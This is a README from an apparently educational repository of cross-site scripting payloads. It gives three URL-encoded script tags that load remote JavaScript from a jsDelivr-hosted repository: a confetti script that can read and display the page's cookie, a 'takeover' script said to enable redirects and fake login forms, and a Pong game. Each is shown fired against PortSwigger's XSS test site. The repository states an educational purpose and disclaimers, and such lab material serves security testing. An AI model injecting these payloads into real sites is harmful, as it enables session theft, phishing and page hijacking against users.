# XSS Payloads for Educational Purposes

<p align="center">

  <!-- Status / Purpose -->
  <img src="https://img.shields.io/badge/Status-Educational-blueviolet?style=for-the-badge&logo=github" alt="Educational" />
  <img src="https://img.shields.io/badge/Use-Authorized_Testing_Only-red?style=for-the-badge&logo=handshake" alt="Authorized Testing Only" />
  <img src="https://img.shields.io/badge/Focus-XSS%20Payloads-orange?style=for-the-badge&logo=javascript" alt="XSS Payloads" />

  <!-- Ethical / Legal -->
  <img src="https://img.shields.io/badge/Responsible_Disclosure-Required-critical?style=for-the-badge&logo=checkmarx" alt="Responsible Disclosure Required" />
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=open-source-initiative" alt="MIT License" />

  <!-- Technologies -->
  <img src="https://img.shields.io/badge/Language-JavaScript-yellow?style=for-the-badge&logo=javascript" alt="JavaScript" />
  <img src="https://img.shields.io/badge/Hosted_on-jsDelivr-lightgrey?style=for-the-badge&logo=cdn" alt="jsDelivr" />

  <!-- Community / Reference -->
  <a href="https://portswigger.net/web-security/cross-site-scripting">
    <img src="https://img.shields.io/badge/Lab-OWASP/PortSwigger-blue?style=for-the-badge&logo=bugcrowd" alt="PortSwigger Labs" />
  </a>
  <a href="https://owasp.org/www-community/xss/">
    <img src="https://img.shields.io/badge/Reference-OWASP_XSS-orange?style=for-the-badge&logo=owasp" alt="OWASP XSS" />
  </a>

</p>


###  Cross Site Scripting ( XSS ) Vulnerability  

### Overview : XSS is a web security flaw that allows an attacker to inject and execute malicious scripts in a victim’s browser by exploiting insufficient input/output encoding or sanitization; it can lead to account takeover, session theft, UI redress, or delivery of phishing/malware.

---

## IMPORTANT: SECURITY & ETHICAL USE DISCLAIMER

This repository contains XSS (Cross-Site Scripting) payloads for educational and ethical security testing purposes only.

### Authorized Use Cases:
- Security research and education
- Penetration testing on systems you own or have explicit written permission to test
- Developing and testing defensive security measures

### Strictly Prohibited:
- Any unauthorized testing on websites or systems you do not own
- Any malicious or illegal activities
- Use in a manner that violates any laws

**By using this repository, you agree to use this information responsibly. The maintainer is not responsible for any misuse or damage.**

---

### Remote XSS Payload Examples

These payloads demonstrate how attackers can load external JavaScript files from remote servers to execute malicious code.

### How Remote XSS Payloads Work:
- The payload uses `<script>` tags with `src` attributes pointing to external JavaScript files
- When the vulnerable page renders, the browser fetches and executes the remote script
- The scripts are hosted on CDN services like jsDelivr, making them accessible from anywhere
  
- This technique allows attackers to:
  
  - Bypass length restrictions (small payload loads large script)
  - Update malicious code without changing the initial payload
  - Load complex libraries and frameworks for advanced attacks

## Payload Examples

### Payload 1
```
%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/confetti_nl.js%3E%3C/script%3E
```
Payload triggered on portswigger test XSS site:
```
https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%3E(function()%7B%27use%20strict%27%3Bfunction%20tryAlert(msg%2CtimeoutMs)%7BtimeoutMs%3DtimeoutMs%7C%7C350%3Btry%7Bvar%20fired%3Dfalse%3Bvar%20t%3DsetTimeout(function()%7Bfired%3Dtrue%3B%7D%2CtimeoutMs)%3Btry%7Balert(msg)%3B%7Dcatch(e)%7BclearTimeout(t)%3Breturn%20false%3B%7DclearTimeout(t)%3Breturn%20true%3B%7Dcatch(e)%7Breturn%20false%3B%7D%7Dfunction%20showToast(text%2Cttl)%7Bttl%3Dtypeof%20ttl%3D%3D%3D%27number%27%3Fttl%3A8000%3Btry%7Bvar%20d%3Ddocument.createElement(%27div%27)%3Bd.textContent%3Dtext%3Bd.style.cssText%3D%5B%27position%3Afixed%27%2C%27right%3A12px%27%2C%27bottom%3A12px%27%2C%27z-index%3A2147483647%27%2C%27background%3Argba(0%2C0%2C0%2C0.86)%27%2C%27color%3A%23fff%27%2C%27padding%3A8px%2012px%27%2C%27border-radius%3A8px%27%2C%27font-family%3Asystem-ui%2CSegoe%20UI%2CArial%2Csans-serif%27%2C%27font-size%3A13px%27%2C%27box-shadow%3A0%206px%2024px%20rgba(0%2C0%2C0%2C0.4)%27%2C%27pointer-events%3Anone%27%2C%27opacity%3A0%27%2C%27transition%3Aopacity%20.22s%27%5D.join(%27%3B%27)%3Bdocument.documentElement.appendChild(d)%3BrequestAnimationFrame(function()%7Bd.style.opacity%3D1%3B%7D)%3BsetTimeout(function()%7Btry%7Bd.style.opacity%3D0%3BsetTimeout(function()%7Btry%7Bd.remove()%3B%7Dcatch(e)%7B%7D%7D%2C240)%3B%7Dcatch(e)%7B%7D%7D%2Cttl)%3B%7Dcatch(e)%7B%7D%7Dfunction%20runConfettiAndMessage()%7Btry%7Bvar%20s%3Ddocument.createElement(%27style%27)%3Bs.textContent%3D%27.c%7Bposition%3Afixed%3Btop%3A-10vh%3Bpointer-events%3Anone%3Banimation%3Afall%209s%20linear%20forwards%3Bwill-change%3Atransform%2Copacity%7D%40keyframes%20fall%7Bto%7Btransform%3AtranslateY(110vh)%20rotate(720deg)%3Bopacity%3A0%7D%7D.msg%7Bposition%3Afixed%3Bleft%3A50%25%3Btop%3A50%25%3Btransform%3Atranslate(-50%25%2C-60%25)%3Bfont-family%3Amonospace%2CSegoe%20UI%2CArial%3Bcolor%3A%23fff%3Bbackground%3Argba(0%2C0%2C0%2C0.72)%3Bpadding%3A14px%2020px%3Bborder-radius%3A10px%3Bfont-size%3A22px%3Bz-index%3A2147483650%3Bopacity%3A0%3Bpointer-events%3Anone%7D%27%3Bdocument.head.appendChild(s)%3Bvar%20w%3Ddocument.createElement(%27div%27)%3Bw.style.cssText%3D%27position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100vw%3Bheight%3A100vh%3Boverflow%3Ahidden%3Bz-index%3A2147483647%3Bpointer-events%3Anone%27%3Bdocument.body.appendChild(w)%3Bvar%20cols%3D%5B%27%23c8102e%27%2C%27white%27%2C%27%233350ec%27%5D%3Bfor(var%20i%3D0%3Bi%3C220%3Bi%2B%2B)%7Bvar%20e%3Ddocument.createElement(%27div%27)%3Be.className%3D%27c%27%3Be.style.left%3D(50%2B(Math.random()-0.5)*100)%2B%27vw%27%3Be.style.top%3D(Math.random()-0.2)*10%2B%27vh%27%3Be.style.width%3D(3%2BMath.random()*7)%2B%27px%27%3Be.style.height%3D(10%2BMath.random()*18)%2B%27px%27%3Be.style.background%3Dcols%5BMath.floor(Math.random()*cols.length)%5D%3Be.style.borderRadius%3D(Math.random()*60)%2B%27%25%27%3Be.style.animationDelay%3D(Math.random()*1.5)%2B%27s%27%3Be.style.transform%3D%27rotate(%27%2BMath.floor(Math.random()*360)%2B%27deg)%27%3Bw.appendChild(e)%3B%7Dvar%20m%3Ddocument.createElement(%27div%27)%3Bm.className%3D%27msg%27%3Bm.textContent%3D%27Education%20matters%20%E2%80%94%20just%20hack%20ethically%27%3Bdocument.body.appendChild(m)%3BsetTimeout(function()%7Bm.style.transition%3D%27opacity%20.9s%20ease%2C%20transform%20.9s%20ease%27%3Bm.style.opacity%3D1%3Bm.style.transform%3D%27translate(-50%25%2C-50%25)%27%3B%7D%2C700)%3BsetTimeout(function()%7Btry%7Bw.remove()%3Bm.remove()%3B%7Dcatch(e)%7B%7D%7D%2C12000)%3B%7Dcatch(e)%7B%7D%7Dtry%7Bvar%20query%3D(location%26%26location.search)%3Flocation.search%3A%27%27%3Bvar%20wantCookie%3D/%5Cbpoc_cookie%3D1%5Cb/.test(query)%3Bvar%20subject%3DwantCookie%3F(typeof%20document.cookie!%3D%3D%27undefined%27%3Fdocument.cookie%3A%27(no-cookie)%27)%3A(typeof%20document.domain!%3D%3D%27undefined%27%26%26document.domain%3Fdocument.domain%3A(location%26%26location.hostname%3Flocation.hostname%3A%27unknown%27))%3Btry%7Bconsole.info(%27%5Bconfetti_nl.js%5D%20PoC%20run%3B%20subject%3D%27%2Csubject%2C%27poc_cookie%3D%27%2CwantCookie%2C%27ts%3D%27%2Cnew%20Date().toISOString())%3B%7Dcatch(e)%7B%7Dvar%20alerted%3DtryAlert(subject%2C350)%3Bif(!alerted)%7BshowToast(subject%2B%27%20(PoC)%27)%3Btry%7Bconsole.info(%27%5Bconfetti_nl.js%5D%20alert%20blocked%3B%20showed%20toast%20as%20fallback.%27)%3B%7Dcatch(e)%7B%7D%7Delse%7Btry%7Bconsole.info(%27%5Bconfetti_nl.js%5D%20alert%20shown%20(user%20dismissed).%27)%3B%7Dcatch(e)%7B%7D%7DrunConfettiAndMessage()%3B%7Dcatch(err)%7Btry%7Bconsole.error(%27%5Bconfetti_nl.js%5D%20runtime%20error%27%2Cerr)%3B%7Dcatch(e)%7B%7D%7D%7D)()%3C/script%3E&context=html
```
- **Action:** This payload loads a remote JavaScript file that creates visual effects (confetti)
- **Impact:** Demonstrates how XSS can modify page content and user experience
- **Host:** Uses jsDelivr CDN to serve the script directly from this GitHub repository
- **Purpose:** Shows non-destructive payloads used for proof-of-concept testing


### Payload 2
```
%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/takeover.js%3E%3C/script%3E
```

Payload triggered on portswigger test XSS site:
```
https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/takeover.js%3E%3C/script%3E&context=html
```
- **Behavior:** Loads a script that demonstrates complete page takeover capabilities
- **Examples:** Could include functionality like redirecting users, displaying fake login forms, or defacing content
- **Impact:** Shows the severe impact of XSS vulnerabilities when combined with remote script loading
- **Note:** The actual malicious logic resides on the remote server, not in the initial payload


### Payload 3
```
%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/pong.js%3E%3C/script%3E
```

Payload triggered on portswigger test XSS site:
```
https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/pong.js%3E%3C/script%3E&context=html
```
- **Action:** Loads an interactive Pong game script onto the vulnerable page
- **Demonstrates:** How XSS can inject complex, interactive content
- **Observation:** Shows that even "benign" payloads use the same vulnerability chain as malicious ones
- **Takeaway:** Highlights the importance of proper input validation regardless of payload intent




